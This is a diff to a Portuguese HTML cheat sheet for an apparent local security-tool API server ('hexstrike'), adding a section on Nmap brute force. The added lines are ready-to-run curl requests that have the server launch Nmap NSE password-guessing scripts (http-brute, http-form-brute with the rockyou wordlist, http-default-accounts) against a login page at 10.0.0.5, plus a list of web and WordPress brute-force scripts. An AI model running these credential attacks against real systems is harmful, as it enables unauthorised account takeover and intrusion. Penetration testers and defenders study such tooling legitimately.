@@ -48,6 +48,20 @@ sed -n 'LINHA,LINHA+40p' hexstrike_server.py</pre></div>
 <h2 id="nmap">1. Nmap — recon e varredura</h2>
 <div class="card"><span class="tag">recon</span><span class="tag">rede</span>
 <p>Usos: descoberta de hosts, portas, versões de serviço, scripts NSE.</p>
+  <p><strong>Brute force com Nmap (NSE) — HTTP/HTTPS, sem nada de SSH:</strong></p>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","scan_type":"--script http-brute -p 80","ports":"80"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","scan_type":"--script http-brute --script-args http-brute.path=/login,userdb=/tmp/users.txt,passdb=/usr/share/wordlists/rockyou.txt -p 443","ports":"443"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","scan_type":"--script http-default-accounts -p 443","ports":"443"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","scan_type":"--script http-form-brute --script-args http-form-brute.path=/login,uservar=user,passvar=pass -p 443","ports":"443"}'</pre>
+<p>Scripts de brute web: <code>http-brute</code> (Basic Auth) · <code>http-form-brute</code> (formulário POST) · <code>http-default-accounts</code> (credenciais padrão de painéis) · <code>http-wordpress-brute</code> (login WP). Em HTTPS o Nmap detecta TLS sozinho na porta 443.</p>
 <pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
   -H "Content-Type: application/json" \
   -d '{"target":"127.0.0.1","scan_type":"-sV","ports":"80,443"}'</pre>
